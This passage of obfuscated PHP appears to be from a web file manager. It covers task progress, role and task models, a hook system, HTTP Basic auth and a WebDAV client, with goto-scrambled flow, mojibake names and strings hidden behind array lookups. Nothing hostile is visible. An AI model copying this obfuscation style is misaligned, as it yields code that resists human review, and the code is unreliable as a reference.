== $GLOBALS[$FÊ√…‡◊¿ì[1450]]) { $D¥ˆö≥£Îª = $GLOBALS[$FÊ√…‡◊¿ì[1451]]; } goto Aëèö€ßÜù; e¡ŒäíôªÇ: $f“ãﬂøÇË¥[$FÊ√…‡◊¿ì[966]] = $FÊ√…‡◊¿ì[33]; $f“ãﬂøÇË¥[$FÊ√…‡◊¿ì[1444]] = $FÊ√…‡◊¿ì[33]; $f“ãﬂøÇË¥[$FÊ√…‡◊¿ì[1445]] = 0; goto AäÁ©ëÀ¨‚; AäÁ©ëÀ¨‚: $this->update(); goto dﬂ¶ÊòìÁ…; Aëèö€ßÜù: $GLOBALS[$FÊ√…‡◊¿ì[1451]] = $fÖÖ∑Ãºù‘; $GLOBALS[$FÊ√…‡◊¿ì[1450]] = $bå”ÕÙ∂ê“; $f“ãﬂøÇË¥ =& $this->task; goto F›¡“ºÓªÌ; F›¡“ºÓªÌ: $f“ãﬂøÇË¥[$FÊ√…‡◊¿ì[1440]] = $D¥ˆö≥£Îª; $f“ãﬂøÇË¥[$FÊ√…‡◊¿ì[1442]] = (int) $BπÀÒ¬ øœ->size($dÒ∞ﬁıÕ©±); $f“ãﬂøÇË¥[$FÊ√…‡◊¿ì[1443]] = 0; goto e¡ŒäíôªÇ; dﬂ¶ÊòìÁ…: } public function copyFileEnd($EéÊÆ‚≤¬Î, $CÔáÓäçùœ, $Dëû¡∆∂¯‘, $dÌªµ‡π∑•, $b≤é—«§ÜÖ, $câ≤∆ïêÇ´) { $fùÙ ∏ÂËÕ =& $_SERVER[Æ¡î¢≠¯™]; $E∂ú∫ŸÇÎÖ =& $this->task; $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1443]] = $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1442]]; $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1444]] = $fùÙ ∏ÂËÕ[33]; if ($b≤é—«§ÜÖ == $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1440]]) { $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1447]] += $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1442]]; $this->update(1); } else { $this->update(); $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1443]] = 0; } self::log($fùÙ ∏ÂËÕ[1452] . $CÔáÓäçùœ . $fùÙ ∏ÂËÕ[76] . $dÌªµ‡π∑• . $fùÙ ∏ÂËÕ[62] . $b≤é—«§ÜÖ . $fùÙ ∏ÂËÕ[1453] . $E∂ú∫ŸÇÎÖ[$fùÙ ∏ÂËÕ[1440]]); } public function updateFileEnd($Eä≠çÙääÈ, $CâœêûÚÿÁ) { $aª∆∞À¬ˆ§ =& $_SERVER[Æ¡î¢≠¯™]; $A¨æ∆Ì¡£á =& $this->task; $A¨æ∆Ì¡£á[$aª∆∞À¬ˆ§[1440]] = $Eä≠çÙääÈ; $A¨æ∆Ì¡£á[$aª∆∞À¬ˆ§[1442]] = $CâœêûÚÿÁ; $A¨æ∆Ì¡£á[$aª∆∞À¬ˆ§[1447]] += $CâœêûÚÿÁ; $this->update(1); } public function sourceModelCopy($AàﬂÇ ÂñΩ) { goto d–“ÿ∞«Ô˘; eÓ‘”çˆìä: $eÆøæÕÀì≥ =& $this->task; $this->sourceModelCopyFlag = !0; $d‹íß†Êè≠ = 0; goto DÔë’œπ∑è; DÔë’œπ∑è: switch ($e—Û€≠Ã›÷) { case $DÖîÂÃúèƒ[511]: $d‹íß†Êè≠ = 1; break; case $DÖîÂÃúèƒ[514]: $eÆøæÕÀì≥[$DÖîÂÃúèƒ[1440]] = $EóëæÉÉ’á[$DÖîÂÃúèƒ[28]]; break; case $DÖîÂÃúèƒ[516]: $d‹íß†Êè≠ = intval($AàﬂÇ ÂñΩ[$DÖîÂÃúèƒ[368]] * 0.4); break; case $DÖîÂÃúèƒ[518]: $d‹íß†Êè≠ = intval($AàﬂÇ ÂñΩ[$DÖîÂÃúèƒ[368]] * 0.2); break; case $DÖîÂÃúèƒ[520]: $d‹íß†Êè≠ = intval($AàﬂÇ ÂñΩ[$DÖîÂÃúèƒ[368]] * 0.4); break; } $this->update($d‹íß†Êè≠); $this->sourceModelCopyFlag = !1; goto fóÊèí∂¡ì; d–“ÿ∞«Ô˘: $DÖîÂÃúèƒ =& $_SERVER[Æ¡î¢≠¯™]; $e—Û€≠Ã›÷ = $AàﬂÇ ÂñΩ[0]; $EóëæÉÉ’á = $AàﬂÇ ÂñΩ[1]; goto eÓ‘”çˆìä; fóÊèí∂¡ì: } public function sourceRemove($Få∆∏ç°úâ, $eˆ›Â¯ı›ã) { $F»ÆªÔø…õ =& $_SERVER[Æ¡î¢≠¯™]; $this->sourceModelCopyFlag = !0; $BÔîÌ©´Ü∆ = 1; if (isset($Få∆∏ç°úâ[$F»ÆªÔø…õ[90]])) { $BÔîÌ©´Ü∆ = $Få∆∏ç°úâ[$F»ÆªÔø…õ[90]][$F»ÆªÔø…õ[88]] + $Få∆∏ç°úâ[$F»ÆªÔø…õ[90]][$F»ÆªÔø…õ[89]] + 1; } $this->update($BÔîÌ©´Ü∆); $this->sourceModelCopyFlag = !1; } public function sourceMove($a†¡Ñô—‰Ú) { $this->sourceRemove($a†¡Ñô—‰Ú, !1); } public function curlProgress($C·ë«êŒùœ, $AÇΩ™Óä´≤, $dõ∫‹¢Ì®‚, $cÔ‚€úº≠ä, $Eèà‡∞ıª¶) { $eõ…ó◊±ñ· =& $_SERVER[Æ¡î¢≠¯™]; $a€ﬂﬁÛ‡‚… =& $this->task; if ($Eèà‡∞ıª¶ > 0) { $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[966]] = $eõ…ó◊±ñ·[1454]; $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1444]] = $eõ…ó◊±ñ·[101]; if ($a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1442]] == $cÔ‚€úº≠ä || $cÔ‚€úº≠ä > 1024 * 1024) { $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1443]] = $Eèà‡∞ıª¶; } if ($a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1445]]) { $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1443]] = $Eèà‡∞ıª¶ + $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1445]]; } } else { if ($dõ∫‹¢Ì®‚ > 0) { if ($a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1442]] == $AÇΩ™Óä´≤) { $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1443]] = $dõ∫‹¢Ì®‚; $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[966]] = $eõ…ó◊±ñ·[1455]; $a€ﬂﬁÛ‡‚…[$eõ…ó◊±ñ·[1444]] = $eõ…ó◊±ñ·[1026]; } } } $this->update(); } public function curlProgressStart($F—π‹⁄“Òø) { } public function curlProgressEnd($B¥Ê—úŒ∏¥) { $AﬁÇ¥©›∑ë =& $_SERVER[Æ¡î¢≠¯™]; $D ÈãüâÒ =& $this->task; $e–ª¥∆ÿ¿á = curl_getinfo($B¥Ê—úŒ∏¥); $c‰‹ïÜÚ‘ı = $e–ª¥∆ÿ¿á[$AﬁÇ¥©›∑ë[1456]]; if ($D ÈãüâÒ[$AﬁÇ¥©›∑ë[1444]] == $AﬁÇ¥©›∑ë[101] && $c‰‹ïÜÚ‘ı) { $D ÈãüâÒ[$AﬁÇ¥©›∑ë[1445]] += $c‰‹ïÜÚ‘ı; } $this->update(); } } goto d‹ÑÖÉÂƒ£; e·®õÕŒ®æ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\162\x6f\x6c\x65\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\x68", "\154\141\x62\145\154", "\144\x69\x73\x70\154\x61\171", "\x73\x79\163\x74\145\155", "\144\145\163\x63", "\x69\x67\x6e\x6f\162\145\x45\170\x74", "\151\147\x6e\157\162\x65\x46\151\154\x65\123\151\172\x65", "\x61\144\x6d\151\x6e\x69\x73\164\162\141\164\157\x72", "\x73\157\x72\164"); public function listData($fã„Â¢ëÇΩ = false, $bÀìÎè¨ï∫ = "\x73\x6f\x72\164", $dªÛ›öÈèﬁ = false) { return parent::listData($fã„Â¢ëÇΩ, $bÀìÎè¨ï∫, $dªÛ›öÈèﬁ); } public function update($B´˘§ﬁê∑´, $A ·û≠ö∫ı) { goto e“€éÕäÎ¡; e“€éÕäÎ¡: $e¬º»‚†Öˆ =& $_SERVER[Æ¡î¢≠¯™]; $eºÛßÕ∏Âí = parent::listData($B´˘§ﬁê∑´); $DçÓπéëàí = $this->findByName($A ·û≠ö∫ı[$e¬º»‚†Öˆ[28]]); goto E´∑‰–ñ™¯; D»å›ÌÔ≤Ù: return parent::update($B´˘§ﬁê∑´, $A ·û≠ö∫ı); goto b–ˆä—„¬∞; E´∑‰–ñ™¯: if (!$eºÛßÕ∏Âí || $DçÓπéëàí && $DçÓπéëàí[$e¬º»‚†Öˆ[372]] != $eºÛßÕ∏Âí[$e¬º»‚†Öˆ[372]]) { return !1; } if ($DçÓπéëàí[$e¬º»‚†Öˆ[2427]] == 1) { $A ·û≠ö∫ı = array($e¬º»‚†Öˆ[28] => $A ·û≠ö∫ı[$e¬º»‚†Öˆ[28]], $e¬º»‚†Öˆ[2079] => $A ·û≠ö∫ı[$e¬º»‚†Öˆ[2079]]); } $this->filterAuth($A ·û≠ö∫ı[$e¬º»‚†Öˆ[381]]); goto D»å›ÌÔ≤Ù; b–ˆä—„¬∞: } public function remove($AÈﬂöîîª∞) { $Eº‰§∆Ñìº = parent::listData($AÈﬂöîîª∞); if (!$Eº‰§∆Ñìº || $Eº‰§∆Ñìº[$_SERVER[Æ¡î¢≠¯™][1066]]) { return !1; } return parent::remove($AÈﬂöîîª∞); } public function add($F◊ÎÊˆ∞ìÚ) { goto dçñöœŸ∫Ü; dçñöœŸ∫Ü: $FÒçÙÃ¶ôÒ =& $_SERVER[Æ¡î¢≠¯™]; $a‰ß•óçÊî = $F◊ÎÊˆ∞ìÚ[$FÒçÙÃ¶ôÒ[28]]; if ($this->findByName($a‰ß•óçÊî)) { return !1; } goto C¨ºê«¢ûä; C¨ºê«¢ûä: $DÜä§ˆ©œ = array($FÒçÙÃ¶ôÒ[391] => $a‰ß•óçÊî, $FÒçÙÃ¶ôÒ[2067] => $FÒçÙÃ¶ôÒ[33], $FÒçÙÃ¶ôÒ[2063] => $FÒçÙÃ¶ôÒ[2080], $FÒçÙÃ¶ôÒ[2428] => 1, $FÒçÙÃ¶ôÒ[2066] => 0, $FÒçÙÃ¶ôÒ[2429] => 0, $FÒçÙÃ¶ôÒ[2065] => $this->getSort()); $F◊ÎÊˆ∞ìÚ = array_merge($DÜä§ˆ©œ, $F◊ÎÊˆ∞ìÚ); $this->filterAuth($F◊ÎÊˆ∞ìÚ[$FÒçÙÃ¶ôÒ[381]]); goto cë¡∑¿„Ù√; cë¡∑¿„Ù√: return parent::insert($F◊ÎÊˆ∞ìÚ); goto c¨öØ∑˜◊å; c¨öØ∑˜◊å: } private function getSort() { $d˘ûΩ÷Â»ì =& $_SERVER[Æ¡î¢≠¯™]; $E¬ƒÕ‰›ˆÑ = parent::listData(); $fãÆî∂¶ä” = array_to_keyvalue($E¬ƒÕ‰›ˆÑ, $d˘ûΩ÷Â»ì[33], $d˘ûΩ÷Â»ì[2082]); return empty($fãÆî∂¶ä”) ? 0 : max($fãÆî∂¶ä”) + 1; } private function filterAuth(&$C“Ì´—‡≠∫) { $cåªüŒ«ﬂ =& $_SERVER[Æ¡î¢≠¯™]; $d∑Œ√°§ô¿ = array(); $c™§≤Öü“ã = array_filter(explode($cåªüŒ«ﬂ[47], $C“Ì´—‡≠∫)); foreach ($c™§≤Öü“ã as $C“Ì´—‡≠∫) { $cﬁëäÊë≠Ú = explode($cåªüŒ«ﬂ[103], $C“Ì´—‡≠∫); if ($cﬁëäÊë≠Ú[0] == $cåªüŒ«ﬂ[1740] && $cﬁëäÊë≠Ú[1] != $cåªüŒ«ﬂ[1022]) { $Dåè∂¢ÑœÃ = $cﬁëäÊë≠Ú[0] . $cåªüŒ«ﬂ[103] . $cﬁëäÊë≠Ú[1] . $cåªüŒ«ﬂ[2430]; if (!in_array($Dåè∂¢ÑœÃ, $c™§≤Öü“ã)) { $d∑Œ√°§ô¿[] = $Dåè∂¢ÑœÃ; } } $d∑Œ√°§ô¿[] = $C“Ì´—‡≠∫; } $C“Ì´—‡≠∫ = implode($cåªüŒ«ﬂ[47], $d∑Œ√°§ô¿); } public function sort($B‚œæñ›ü’, $e¿‰Ò—Ÿö©) { return parent::update($B‚œæñ›ü’, $e¿‰Ò—Ÿö©); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x74\x61\x73\x6b\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\x74\171\160\145", "\145\x76\145\156\164", "\164\151\155\145", "\144\x65\163\x63", "\163\x79\163\x74\x65\155", "\145\x6e\x61\142\x6c\x65", "\x6c\141\x73\164\x52\165\x6e", "\163\157\x72\x74"); public function listData($CüêØâû‘∂ = false, $c∂πÉÑ†ëÃ = "\x73\157\x72\164", $Fî∑âó´Æ£ = false) { return parent::listData($CüêØâû‘∂, $c∂πÉÑ†ëÃ, $Fî∑âó´Æ£); } public function add($cäÛÈ¨‚ﬂà) { $eÎ æ∏‰Ÿ÷ =& $_SERVER[Æ¡î¢≠¯™]; $BΩ¡•ÀÈ¥Ë = $this->findByName($cäÛÈ¨‚ﬂà[$eÎ æ∏‰Ÿ÷[28]]); if ($BΩ¡•ÀÈ¥Ë) { return !1; } $cäÛÈ¨‚ﬂà[$eÎ æ∏‰Ÿ÷[1362]] = 0; $cäÛÈ¨‚ﬂà[$eÎ æ∏‰Ÿ÷[2082]] = $this->getSort(); return parent::insert($cäÛÈ¨‚ﬂà); } private function getSort() { $f⁄©åﬂÏæ– =& $_SERVER[Æ¡î¢≠¯™]; $cÊîä“’ô– = parent::listData(); $BìâºÍ¡Ê∞ = array_to_keyvalue($cÊîä“’ô–, $f⁄©åﬂÏæ–[33], $f⁄©åﬂÏæ–[2082]); return empty($BìâºÍ¡Ê∞) ? 0 : max($BìâºÍ¡Ê∞) + 1; } public function update($F€·†·ÿë–, $aÒ†∆¢πÁÖ) { $c©é˘ï˜å¢ =& $_SERVER[Æ¡î¢≠¯™]; $bÀè√≤ò¬ç = $this->listData($F€·†·ÿë–); $F◊Ô’◊êÂô = $this->findByName($aÒ†∆¢πÁÖ[$c©é˘ï˜å¢[28]]); if (!$bÀè√≤ò¬ç || $F◊Ô’◊êÂô && $F◊Ô’◊êÂô[$c©é˘ï˜å¢[372]] != $bÀè√≤ò¬ç[$c©é˘ï˜å¢[372]]) { return !1; } return parent::update($F€·†·ÿë–, $aÒ†∆¢πÁÖ); } public function remove($a¢†®Ø§†◊, $dÒÊ€É¶®œ = false) { $C£æ®‚∑üâ =& $_SERVER[Æ¡î¢≠¯™]; $e≤ì£‰£ë’ = $this->listData($a¢†®Ø§†◊); if (!$e≤ì£‰£ë’) { return; } if (!$dÒÊ€É¶®œ && $e≤ì£‰£ë’[$C£æ®‚∑üâ[1066]] == $C£æ®‚∑üâ[93]) { return !1; } return parent::remove($a¢†®Ø§†◊); } public function enable($f›Ô¯º‚◊—, $CàÍáøÒ„Ì) { return $this->update($f›Ô¯º‚◊—, array($_SERVER[Æ¡î¢≠¯™][2421] => $CàÍáøÒ„Ì)); } public function run($dÜ‚¯¡‘¨’) { return $this->update($dÜ‚¯¡‘¨’, array($_SERVER[Æ¡î¢≠¯™][2431] => time())); } } goto d„” ∂òÑ≠; Aﬂ¨‘ıÉ„‰: class Hook { private static $events = array(); public static function get($cµı‡ÕÛ¬ö = false) { if (!$cµı‡ÕÛ¬ö) { return self::$events; } else { return self::$events[$cµı‡ÕÛ¬ö]; } } public static function apply($d‰ÉÊË€©±, $FÙ©åõ¥ÔÇ = array()) { $eÒ„ÑíıÀï = ActionApply($d‰ÉÊË€©±, $FÙ©åõ¥ÔÇ); if (is_string($d‰ÉÊË€©±)) { Hook::trigger($d‰ÉÊË€©±); } return $eÒ„ÑíıÀï; } public static function bind($aåﬂ‡…Ú≠¢, $A¢√—ä˘˘÷, $a‹íÛÖ™≤◊ = false) { $A≠Ñ∂·Áîö =& $_SERVER[Æ¡î¢≠¯™]; if (!isset(self::$events[$aåﬂ‡…Ú≠¢])) { self::$events[$aåﬂ‡…Ú≠¢] = array(); } self::$events[$aåﬂ‡…Ú≠¢][] = array($A≠Ñ∂·Áîö[1707] => $A¢√—ä˘˘÷, $A≠Ñ∂·Áîö[1708] => $a‹íÛÖ™≤◊, $A≠Ñ∂·Áîö[1709] => 0); } public static function once($FÌ◊ΩÎ„ƒÆ, $EÛïÌ—≠«¶) { self::bind($FÌ◊ΩÎ„ƒÆ, $EÛïÌ—≠«¶, !0); } public static function unbind($cÕÑ€´÷Ô„, $Fóí‡™àÙí = false) { if (!$Fóí‡™àÙí) { self::$events[$cÕÑ€´÷Ô„] = array(); return; } $c∏ﬁ„®◊√û = self::$events[$cÕÑ€´÷Ô„]; self::$events[$cÕÑ€´÷Ô„] = array(); if (!is_array($c∏ﬁ„®◊√û)) { return; } for ($CëÁë´Ó—• = 0; $CëÁë´Ó—• < count($c∏ﬁ„®◊√û); $CëÁë´Ó—•++) { if ($c∏ﬁ„®◊√û[$CëÁë´Ó—•][$_SERVER[Æ¡î¢≠¯™][1707]] == $Fóí‡™àÙí) { continue; } self::$events[$cÕÑ€´÷Ô„][] = $c∏ﬁ„®◊√û[$CëÁë´Ó—•]; } } public static function filter($aæ®ãûõûá, $dÍ¶ﬁ˘¬Ô˘) { goto c‚”â∂±»÷; c‚”â∂±»÷: $B´‰ÿ†Èé˜ =& $_SERVER[Æ¡î¢≠¯™]; $C∏≈ úÆç¨ = self::$events; if (!isset($C∏≈ úÆç¨[$aæ®ãûõûá])) { return $dÍ¶ﬁ˘¬Ô˘; } goto E©ç¥∂íª·; E©ç¥∂íª·: $D–Øº◊è¢¥ = $C∏≈ úÆç¨[$aæ®ãûõûá]; $f§Ø™™‰˘á = $dÍ¶ﬁ˘¬Ô˘; if (!is_array($D–Øº◊è¢¥) || count($D–Øº◊è¢¥) == 0) { return $f§Ø™™‰˘á; } goto d∆–Ç‰•∂®; d∆–Ç‰•∂®: for ($BäÎ´ë¢æ· = 0; $BäÎ´ë¢æ· < count($D–Øº◊è¢¥); $BäÎ´ë¢æ·++) { $e—âÒåî–† = $D–Øº◊è¢¥[$BäÎ´ë¢æ·]; if ($e—âÒåî–†[$B´‰ÿ†Èé˜[1708]] && $e—âÒåî–†[$B´‰ÿ†Èé˜[1709]] > 1) { continue; } self::$events[$aæ®ãûõûá][$BäÎ´ë¢æ·][$B´‰ÿ†Èé˜[1709]] = $e—âÒåî–†[$B´‰ÿ†Èé˜[1709]] + 1; $Bç™™ç¥€Ç = self::apply($e—âÒåî–†[$B´‰ÿ†Èé˜[1707]], array($f§Ø™™‰˘á)); if (!is_null($Bç™™ç¥€Ç)) { $f§Ø™™‰˘á = $Bç™™ç¥€Ç; } } return $f§Ø™™‰˘á; goto Fë‰‘Ö∆ÍÆ; Fë‰‘Ö∆ÍÆ: } public static function trigger($F¬πÑÓ≠Î¥) { goto bÉí›êü≈Ü; Côä¢•≈»»: if (!isset($Cû’†’ëîà[$F¬πÑÓ≠Î¥])) { return $d†ÕãÙ°òÙ; } $F«ó„†≠™œ = $Cû’†’ëîà[$F¬πÑÓ≠Î¥]; if (!is_array($F«ó„†≠™œ) || count($F«ó„†≠™œ) == 0) { return $d†ÕãÙ°òÙ; } goto e◊“ê°ËÉ◊; BêØ«æÜÖâ: return $d†ÕãÙ°òÙ; goto fäıê£ù¢©; e◊“ê°ËÉ◊: $F‘™€‘Ç”á = func_get_args(); array_shift($F‘™€‘Ç”á); for ($BﬁÎœª¥Éå = 0; $BﬁÎœª¥Éå < count($F«ó„†≠™œ); $BﬁÎœª¥Éå++) { $d¯ÕóòÎ≈∂ = $F«ó„†≠™œ[$BﬁÎœª¥Éå]; if ($d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1708]] && $d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1709]] > 1) { continue; } if (defined($C¯°ÍáΩÿç[1710]) && GLOBAL_LOG_HOOK) { write_log($F¬πÑÓ≠Î¥ . $C¯°ÍáΩÿç[1711] . $d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1707]], $C¯°ÍáΩÿç[1712]); } self::$events[$F¬πÑÓ≠Î¥][$BﬁÎœª¥Éå][$C¯°ÍáΩÿç[1709]] = $d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1709]] + 1; $FÎÛùâ‘âÀ = self::apply($d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1707]], $F‘™€‘Ç”á); if (defined($C¯°ÍáΩÿç[1710]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $C¯°ÍáΩÿç[1712]); if ($d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1709]] == 200) { $BùŒÔÚ¶£ó = is_array($d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1707]]) ? json_encode_force($d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1707]]) : $d¯ÕóòÎ≈∂[$C¯°ÍáΩÿç[1707]]; write_log($C¯°ÍáΩÿç[1713] . $F¬πÑÓ≠Î¥ . $C¯°ÍáΩÿç[1714] . $BùŒÔÚ¶£ó, $C¯°ÍáΩÿç[1715]); } } $d†ÕãÙ°òÙ = is_null($FÎÛùâ‘âÀ) ? $d†ÕãÙ°òÙ : $FÎÛùâ‘âÀ; } goto BêØ«æÜÖâ; bÉí›êü≈Ü: $C¯°ÍáΩÿç =& $_SERVER[Æ¡î¢≠¯™]; $Cû’†’ëîà = self::$events; $d†ÕãÙ°òÙ = !1; goto Côä¢•≈»»; fäıê£ù¢©: } } class HttpAuth { public static function get() { $d≈¨çÈ˜´Õ =& $_SERVER[Æ¡î¢≠¯™]; $EÖÃÃ⁄Ôã¥ = $d≈¨çÈ˜´Õ[33]; $b¿Û°¶¬ﬂé = $d≈¨çÈ˜´Õ[33]; if (isset($_SERVER[$d≈¨çÈ˜´Õ[1716]])) { $EÖÃÃ⁄Ôã¥ = $_SERVER[$d≈¨çÈ˜´Õ[1716]]; $b¿Û°¶¬ﬂé = $_SERVER[$d≈¨çÈ˜´Õ[1717]]; } elseif (isset($_SERVER[$d≈¨çÈ˜´Õ[1718]])) { $C‚úˆÉ·Ü‚ = $_SERVER[$d≈¨çÈ˜´Õ[1718]]; if (strpos(strtolower($C‚úˆÉ·Ü‚), $d≈¨çÈ˜´Õ[1719]) === 0) { $f›Âï∫¢∂≈ = explode($d≈¨çÈ˜´Õ[4], base64_decode(substr($C‚úˆÉ·Ü‚, 6))); $EÖÃÃ⁄Ôã¥ = isset($f›Âï∫¢∂≈[0]) ? $f›Âï∫¢∂≈[0] : $d≈¨çÈ˜´Õ[33]; $b¿Û°¶¬ﬂé = isset($f›Âï∫¢∂≈[1]) ? $f›Âï∫¢∂≈[1] : 0; } } return array($d≈¨çÈ˜´Õ[539] => $EÖÃÃ⁄Ôã¥, $d≈¨çÈ˜´Õ[885] => $b¿Û°¶¬ﬂé); } public static function error() { goto Eä¥≥˜á±ø; Eä¥≥˜á±ø: $eﬂ¢Ûî≥¯ø =& $_SERVER[Æ¡î¢≠¯™]; header($eﬂ¢Ûî≥¯ø[1720]); header($eﬂ¢Ûî≥¯ø[1721]); goto EçÆé∫áÇﬁ; EçÆé∫áÇﬁ: header($eﬂ¢Ûî≥¯ø[1722]); header($eﬂ¢Ûî≥¯ø[1723]); header($eﬂ¢Ûî≥¯ø[1241]); goto Eêô÷ôå¥ª; Eêô÷ôå¥ª: die; goto aØÇö∑—¯í; aØÇö∑—¯í: } public static function make($BÑÃÎ·Áœı, $C∂ê∆ÁÁﬂº) { $C…ê∑Õ≤ˆˆ =& $_SERVER[Æ¡î¢≠¯™]; return $C…ê∑Õ≤ˆˆ[1724] + base64_encode($BÑÃÎ·Áœı . $C…ê∑Õ≤ˆˆ[4] . $C∂ê∆ÁÁﬂº); } } class HttpDavClient { public function __construct($fèáÈÿÊÆ§, $AÑøß¥Ñ±à, $FÑ‘Ö√∆ŒÇ) { $this->header = array(); $this->userName = $AÑøß¥Ñ±à; $this->userPassowrd = $FÑ‘Ö√∆ŒÇ; } protected function makePath($BØ⁄Ç îø∫) { return $BØ⁄Ç îø∫; } protected function setHeader($eãËíùƒ¥á, $a¿Î¬µ∑áÛ = false) { if ($a¿Î¬µ∑áÛ === !1) { $this->header[] = $eãËíùƒ¥á; } else { $this->header[] = $eãËíùƒ¥á . $_SERVER[Æ¡î¢≠¯™][868] . $a¿Î¬µ∑áÛ; } } public function move($C®Ü‚«Öâ, $cä®Œüœ‰∫, $d¿Ãá‚úÍà = '') { $CÛ§»î‰ûÜ =& $_SERVER[Æ¡î¢≠¯™]; $this->setHeader($CÛ§»î‰ûÜ[1725], $this->makePath($cä®Œüœ‰∫)); $this->setHeader($CÛ§»î‰ûÜ[1726], $CÛ§»î‰ûÜ[1727]); if ($d¿Ãá‚úÍà) { $this->setHeader($CÛ§»î‰ûÜ[1728], $CÛ§»î‰ûÜ[913] . $d¿Ãá‚úÍà . $CÛ§»î‰ûÜ[916]); } return $this->send($CÛ§»î‰ûÜ[1729], $C®Ü‚«Öâ); } public function copy($DÁìüˆ»›¬, $aºΩµ≠Õ‘û) { $A ë±ß‹É∞ =& $_SERVER[Æ¡î¢≠¯™]; $this->setHeader($A ë±ß‹É∞[1725], $this->makePath($aºΩµ≠Õ‘û)); $this->setHeader($A ë±ß‹É∞[1726], $A ë±ß‹É∞[1727]); return $this->send($A ë±ß‹É∞[1730], $DÁìüˆ»›¬); } public function mkcol($Bìì¬ç¿êá) { $B‡±◊Ã≤–¬ =& $_SERVER[Æ¡î¢≠¯™]; $this->setHeader($B‡±◊Ã≤–¬[1726], $B‡±◊Ã≤–¬[1727]); return $this->send($B‡±◊Ã≤–¬[1731], $Bìì¬ç¿êá); } public function delete($cÔàë≤à–≈, $EÜ¢·íêåÚ = '') { $DıŸ¬·«ôº =& $_SERVER[Æ¡î¢≠¯™]; if ($EÜ¢·íêåÚ) { $this->setHeader($DıŸ¬·«ôº[1728], $DıŸ¬·«ôº[913] . $EÜ¢·íêåÚ . $DıŸ¬·«ôº[916]); } return $this->send($DıŸ¬·«ôº[1229], $cÔàë≤à–≈); } public function propfind($Cá¡ƒÉí√◊) { $aÇÉ¯ãäØÑ =& $_SERVER[Æ¡î¢≠¯™]; $this->setHeader($aÇÉ¯ãäØÑ[1732], $aÇÉ¯ãäØÑ[93]); $this->setHeader($aÇÉ¯ãäØÑ[1733], $aÇÉ¯ãäØÑ[1734]); $a¥®›ûÎÕ• = $aÇÉ¯ãäØÑ[1735]; return $this->send($aÇÉ¯ãäØÑ[1736], $Cá¡ƒÉí√◊, $a¥®›ûÎÕ•); } public function options($D•Ü‡ÉÖªﬂ) { return $this->send($_SERVER[Æ¡î¢≠¯™][1737], $D•Ü‡ÉÖªﬂ); } public function get($Cê≥Ω«ÃÓΩ) { return $this->send($_SERVER[Æ¡î¢≠¯™][223], $Cê≥Ω«ÃÓΩ); } public function put($cﬂÙõªÊò®, $dﬁÜìæ—øÙ, $dÆ‰Î•¥ï⁄ = '') { $Eü∆¢Ù‹¯¯ =& $_SERVER[Æ¡î¢≠¯™]; if ($dÆ‰Î•¥ï⁄) { $this->setHeader($Eü∆¢Ù‹¯¯[1728], $Eü∆¢Ù‹¯¯[913] . $dÆ‰Î•¥ï⁄ . $Eü∆¢Ù‹¯¯[916]); } return $this->send($Eü∆¢Ù‹¯¯[221], $cﬂÙõªÊò®, $dﬁÜìæ—øÙ); } protected function send($BÆ“ı≤™∆, $dëîÆ’∏¬“, $cã‘ıõ“€∫ = false, $A¡ƒÙ≥ÏÖœ = false) { goto dﬂ∞¶å‹„¬; cË∫‡ÎÚ±: $this->header = array(); return $Fˆ∞∏Ωâéâ; goto Cƒùøâı–±; dﬂ∞¶å‹„¬: $eÊË´£Æ∆› =& $_SERVER[Æ¡î¢≠¯™]; $E‹áâ∑ñîé = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($eÊË´£Æ∆›[1738], $eÊË´£Æ∆›[50]); goto Dœıô”∑¿Í; Dœıô”∑¿Í: $this->setHeader($E‹áâ∑ñîé); if ($cã‘ıõ“€∫) { $cã‘ıõ“€∫ = $eÊË´£Æ∆›[1739] . $cã‘ıõ“€∫; } if (!request_url_safe($dëîÆ’∏¬“)) { return !1; } goto DÜŸçáè–ô; b÷√èΩ‹¨û: curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto c≤πÓ÷å¯ß; DÜŸçáè–ô: $Añ‡≤˘∞≈ﬁ = curl_init($dëîÆ’∏¬“); curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_CUSTOMREQUEST, $BÆ“ı≤™∆); curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto b÷√èΩ‹¨û; c≤πÓ÷å¯ß: 